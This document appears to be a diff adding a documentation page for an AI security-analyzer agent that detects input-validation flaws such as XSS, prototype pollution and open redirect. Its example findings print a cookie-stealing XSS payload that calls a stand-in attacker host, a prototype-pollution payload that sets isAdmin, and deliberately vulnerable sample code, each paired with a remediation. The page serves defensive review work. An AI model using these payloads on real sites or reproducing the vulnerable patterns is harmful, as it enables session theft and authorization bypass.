@@ -1,0 +1,159 @@
+---
+title: Input Validation Vulnerabilities
+description: Input validation analyzer for XSS, prototype pollution, open redirect, SSRF, file upload vulnerabilities, unsafe deserialization, and ReDoS
+---
+
+# Input Validation Vulnerabilities
+
+The Security Analyzer: Input Validation Vulnerabilities is a specialized security analyzer focused on **input validation vulnerabilities**. It finds weaknesses where untrusted user input is processed without proper validation or sanitization, enabling attacks like XSS, SSRF, or prototype pollution.
+
+## When to Use
+
+Use this agent when:
+- You need to find XSS vulnerabilities in DOM manipulation or template rendering
+- You want to identify prototype pollution in object merging operations
+- You're checking for open redirect vulnerabilities in URL handling
+- You need to detect SSRF risks in server-side HTTP requests
+- You want to find file upload vulnerabilities without type/size validation
+- You're analyzing for unsafe deserialization of untrusted data
+- You need to check regular expressions for ReDoS (Regular Expression Denial of Service)
+
+## How It Works
+
+1. **Reads target code** - Focuses on template rendering, DOM manipulation, object merging, URL construction, file uploads, and deserialization operations
+2. **Identifies patterns** - Looks for `dangerouslySetInnerHTML`, `innerHTML`, unescaped output, object spread operators with user data, unvalidated redirects, and unsafe regex patterns
+3. **Reports findings** - Generates structured findings with specific locations, severity levels, exploit scenarios, and suggested fixes
+4. **Validates safeguards** - Checks for framework escaping, allowlist validation, and input type checking
+
+## Focus Areas
+
+- **XSS (Cross-Site Scripting)**: `dangerouslySetInnerHTML`, `innerHTML`, `v-html`, `document.write`, unescaped output in templates
+- **Prototype pollution**: `Object.assign`, spread operators, deep merge with user-controlled keys (e.g., `__proto__`, `constructor`)
+- **Open redirect**: Redirects using user-controlled URLs without allowlist validation
+- **SSRF (Server-Side Request Forgery)**: Server-side HTTP requests using user-supplied URLs
+- **File upload vulnerabilities**: No type/size validation, executable file upload, path traversal in filenames
+- **Unsafe deserialization**: `pickle.loads`, `yaml.load` (unsafe), `eval`, `Function()`, `JSON.parse` of untrusted complex objects
+- **ReDoS (Regular Expression Denial of Service)**: Catastrophic backtracking in regexes processing user input
+
+## Tools Available
+
+This agent has access to: Read, Glob, Grep
+
+## Example Analysis
+
+Given this code:
+
+```jsx
+// VULN: User content rendered as HTML without escaping
+<div dangerouslySetInnerHTML={{ __html: userComment }} />
+
+// VULN: Unvalidated redirect
+app.get('/redirect', (req, res) => {
+  res.redirect(req.query.url); // attacker: ?url=https://evil.com
+});
+
+// VULN: Deep merge without prototype key filtering
+function deepMerge(target, source) {
+  for (const key in source) {
+    target[key] = source[key]; // __proto__ or constructor can be set
+  }
+}
+```
+
+The Input Validation analyzer would identify:
+
+### Finding: Stored XSS via dangerouslySetInnerHTML
+
+**Location**: `components/CommentDisplay.tsx:15`
+**Severity**: HIGH
+**Confidence**: HIGH
+**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+**OWASP**: A03:2021 Injection
+
+**Issue**: User-supplied comment text is rendered directly as HTML without escaping. An attacker can inject malicious scripts that execute in other users' browsers.
+
+**Exploit Scenario**:
+- Input: `<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)"/>`
+- Result: Script executes when comment is viewed, stealing user's session cookie
+
+**Remediation**:
+```jsx
+// SAFE: Use React's built-in escaping
+<div>{userComment}</div>
+
+// OR: Explicitly escape HTML
+import DOMPurify from 'dompurify';
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />
+```
+
+### Finding: Prototype pollution via deep merge
+
+**Location**: `utils/merge.ts:8`
+**Severity**: HIGH
+**Confidence**: HIGH
+**CWE**: CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)
+**OWASP**: A03:2021 Injection
+
+**Issue**: The `deepMerge` function allows setting `__proto__` or `constructor.prototype` properties, polluting the global object prototype and affecting all objects.
+
+**Exploit Scenario**:
+- Input: `{ "__proto__": { "isAdmin": true } }`
+- Result: All subsequent objects inherit `isAdmin: true`, bypassing authorization checks
+
+**Remediation**:
+```javascript
+// SAFE: Filter out prototype-related keys
+function deepMerge(target, source) {
+  for (const key in source) {
+    if (key !== '__proto__' && key !== 'constructor' && key !== 'prototype') {
+      target[key] = source[key];
+    }
+  }
+}
+```
+
+## Best Practices
+
+- Use framework auto-escaping for template output (React JSX, Angular, Go `html/template`)
+- Avoid `dangerouslySetInnerHTML` unless using a sanitizer like DOMPurify
+- Use `textContent` instead of `innerHTML` for plain text
+- Validate and allowlist redirect URLs (never redirect to user input)
+- Restrict server-side HTTP requests to allowlisted domains
+- Validate file uploads: check MIME type, size, and sanitize filenames
+- Use `JSON.parse` for JSON deserialization; avoid `eval()` and `Function()`
+- Avoid nested quantifiers in regular expressions processing user input
+- Use parameterized queries instead of string concatenation for any data store
+
+## Output Format
+
+For each potential issue, the agent provides:
+- **Location**: Exact file path and line number
+- **Severity**: CRITICAL (RCE/data theft), HIGH (stored XSS/SSRF), MEDIUM (reflected XSS/redirect), LOW (hardening)
+- **Confidence**: HIGH, MEDIUM, or LOW
+- **CWE**: Standard CWE identifier
+- **OWASP**: OWASP Top 10 category
+- **Code**: Relevant code snippet
+- **Issue**: Clear explanation of how untrusted input is processed unsafely
+- **Exploit Scenario**: Specific input that triggers the vulnerability with expected impact
+- **Remediation**: Corrected approach with code example
+
+## Example Usage
+
+```text
+Task(
+  description: "Analyze input handling for XSS and injection",
+  prompt: "Review src/ui/ and src/api/ for input validation vulnerabilities. Focus on DOM manipulation, redirects, and object merging.",
+  subagent_type: "agileflow-security-analyzer-input"
+)
+```
+
+## Related Agents
+
+- [`security-analyzer-injection`](/agents/security-analyzer-injection) - SQL and command injection detection
+- [`security-analyzer-auth`](/agents/security-analyzer-auth) - Authentication weakness detection
+- [`security-analyzer-authz`](/agents/security-analyzer-authz) - Authorization and access control analysis
+- [`security-analyzer-secrets`](/agents/security-analyzer-secrets) - Hardcoded credentials and weak crypto detection
+- [`security-analyzer-deps`](/agents/security-analyzer-deps) - Vulnerable dependency analysis
+- [`security-analyzer-api`](/agents/security-analyzer-api) - API security weakness detection
+- [`security-analyzer-infra`](/agents/security-analyzer-infra) - Infrastructure and deployment security analysis
+- [`security-consensus`](/agents/security-consensus) - Security audit consensus coordinator
